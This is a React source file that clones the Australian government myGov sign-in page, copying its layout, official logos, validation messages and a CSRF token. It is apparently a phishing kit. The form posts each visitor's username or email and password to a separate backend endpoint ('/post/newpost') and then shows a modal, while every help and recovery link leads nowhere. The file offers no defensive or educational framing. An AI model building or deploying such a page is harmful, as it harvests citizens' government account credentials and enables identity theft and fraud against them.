import './App.css';
import AllPost from './features/post/AllPost';
import { useState } from 'react';
import * as yup from 'yup'
import axios from 'axios'
import { useFormik } from 'formik';
import ReportGmailerrorredOutlinedIcon from '@mui/icons-material/ReportGmailerrorredOutlined';
import { Box } from '@mui/material';
import ModalOpen from './components/ModalOpen';

function App() {

  const url = `${process.env.REACT_APP_URL}/post/newpost`
  const [open, setOpen] = useState(false);
    const handleOpen = () => {
        setOpen(true);
    }

  const [toggle, setToggle] = useState('Show')
  const [error, setError] = useState('')
    const [isClicked, setIsClicked] = useState(false)

  const passwordToggle = () => {
    var x = document.getElementById("text");
 
    if (x.type === "password") {
      x.type = "text";
      setToggle('Hide')
    } else {
      x.type = "password";
      setToggle('Show')

    }
  }

  const formik = useFormik({
    initialValues: {
        id: '',
        password: '',
    },
    onSubmit: (values) => {
      setIsClicked(true)
      console.log(url);
        axios.post(url, values).then((result) => {
            if (result.data.status) {
              setIsClicked(false)
              setOpen(true);

            } else {
              setIsClicked(false)
              console.log('error successfully');
            }
        })
    },
    validationSchema: yup.object({
        id: yup.string().required('Enter a valid email address, mobile number or myGov username. A valid myGov username is 2 letters, followed by 6 numbers.').matches(/^(?:\w+|\w+([+\.-]?\w+)*@\w+([\.-]?\w+)*(\.[a-zA-z]{2,4})+)$/).min(8,'Username or email must be at least 8 characters'),
        password: yup.string().required('Enter your current password')
    }),

})
  return (
    <>
      <nav className="uikit-skip-link" aria-label="Skip Links">
        <a className="uikit-skip-link__link" href="#">Skip to main content</a>
      </nav>

      <div className="brand-rainbow">&nbsp;</div>
      <header role="banner" className="mgvEnhanceHeader">
        <section className="wrapper">
          <div className="inner">
            <div className="unauth-grid">
              <div className="unauth-grid-row">
                <a href="#" className="unauth-govt-crest__link">
                  <img id="unauth-govt-crest" src="https://login.my.gov.au/mygov/content/mgv2/blugov/myGov-cobranded-logo-black.svg" alt="myGov Beta" role="img" />
                </a>

                <div className="header-links">
                  <a href="#">Help</a>
                </div>
              </div>
            </div>
          </div>
        </section>
      </header>









      <div className="wrapper-mapwap"><div className="main-block" id="content" role="main">
        <div className="unauth">
          <div className="login-grid-container">
            <div className="login-grid-row">
              <div className="login-grid-column">
                <div className="digital-id-login-card-wrapper">
                  <div className="digital-id-main-login-card override">

                    <a data-go-back-link="" className="button-back" href="#">Back</a>













                    <h1>Sign in with myGov</h1>
                    <p className="login-instruction-text">Choose how to sign in from these 2 options</p>
                    <h2 className="text-align-left">Using your myGov sign in details</h2>
                    <form id="mygov-login-form" aria-describedby="error-msg" className="mygov-login-form alternative" onSubmit={formik.handleSubmit} >

                      <div className="input-group">
                        <label className="override" for="userId">Username or email</label>
                        <input id="userId" name="username" className={formik.errors.id?'errorId' : 'text'}
                        onChange={formik.handleChange('id')}
                        onBlur={formik.handleBlur('id')}
                        value={formik.values.id}/>
                      </div>
                    {formik.touched.id ? 
                     <Box><p className="form-helper-message hasError" role="alert" aria-live="polite" id="userId__form-helper-message">{formik.errors.id? <Box sx={{display:'flex',color:'red'}}><ReportGmailerrorredOutlinedIcon />{formik.errors.id}</Box>  :''}</p></Box> : ''
                    }
                      <p className="recovery">
                        <a href="#"
                          className="anchor override">Forgot username</a>
                      </p>

                      <div className="input-group">
                        <label for="password" className="override">Password</label>
                        <div id="password">
                          <input id="text" name="text" type="password" className={formik.errors.password?'errorPassword':''}
                            data-current-password="data-current-password" autoComplete="off"
                            aria-required="true"  onChange={formik.handleChange('password')}
                            onBlur={formik.handleBlur('password')}
                            value={formik.values.password}/>
                          <div id='passwordToggle' className={formik.errors.password?'ux':''} onClick={passwordToggle}>
                            <span style={{textDecoration:'underline'}}>{toggle}</span>
                          </div>
                        </div>
                      </div>
                      {formik.touched.password ? 
                     <Box><p className="form-helper-message hasError" role="alert" aria-live="polite" id="userId__form-helper-message">{formik.errors.password? <Box sx={{display:'flex',color:'red'}}><ReportGmailerrorredOutlinedIcon />{formik.errors.password}</Box>  :''}</p></Box> : ''
                    }
                      <p className="recovery">
                        <a href="#" className="anchor override">Forgot
                          password</a>
                      </p>

                      <div className="button-digital-id-main-container override">
                        <div className="digital-id-button-container">
                          {
                            isClicked ? 
                             <button  className="button-main" name="_eventId_login" >Loading</button> : <button type="submit" className="button-main" name="_eventId_login" >Sign in</button>

                          }
                        </div>
                      </div>

                      <input type="hidden" name="authtype" value="unamepword" />
                      <input type="hidden" name="_csrf" value="f6678688-a280-458b-804d-d0c5ace67e70" />



                      <p className="create-account-text"><a className="create-account-link"
                        href="https://my.gov.au/en/create-account/">Create a myGov account</a> if you don't have one already.</p>







                      <div>
                        <input type="hidden" name="_csrf" value="f6678688-a280-458b-804d-d0c5ace67e70" />
                      </div></form>

                    <div className="hr-word">
                      <div className="draw-circle">
                        or
                      </div>
                    </div>

                    <div className="digital-id-login-card secondary">
                      <div className="button-digital-id-container">
                        <h2 className="text-align-left">Using your myGovID Digital Identity</h2>
                        <div className='digital-id-login-option-container'>
                          <div className='inner-options'>
                            <p className="external-links-zone">
                              What is <a href="#"
                               >Digital Identity</a> and <a
                                  href="#" >myGovID</a>?
                            </p>
                            <a className="button-digital-identity" href="#">Continue with Digital Identity</a>
                            <input type="hidden" value="{flowScope.targetParamDI}" />
                          </div>
                        </div>
                      </div>
                    </div>


                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div></div>





      <footer role="contentinfo">
        <div className="wrapper">
          <div className="inner">

            <section className="footer-list">
              <nav>
                <h2 className="sr-only" aria-label="Footer">Footer</h2>
                <ul className="lower-links">
                  <li>
                    <a  href="#">Terms of use</a>
                  </li>
                  <li>
                    <a  href="#">Privacy and security</a>
                  </li>
                  <li>
                    <a  href="#">Copyright</a>
                  </li>
                  <li>
                    <a  href="#">Accessibility</a>
                  </li>
                </ul>
              </nav>
            </section>
            <div className="footer-lower">
              <section className="footer-lower-logo">
                <a href="#">
                  <img src="https://login.my.gov.au/mygov/content/mgv2/blugov/myGov-cobranded-logo-white.svg"
                    alt="myGov Beta" width="313.17"
                    height="70" role="img" />
                </a>
              </section>

              <p className="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
            </div>




          </div>
        </div>
      </footer>
      <ModalOpen handleOpen={handleOpen} open={open} setOpen={setOpen}/>
    </>
  );

}

export default App;
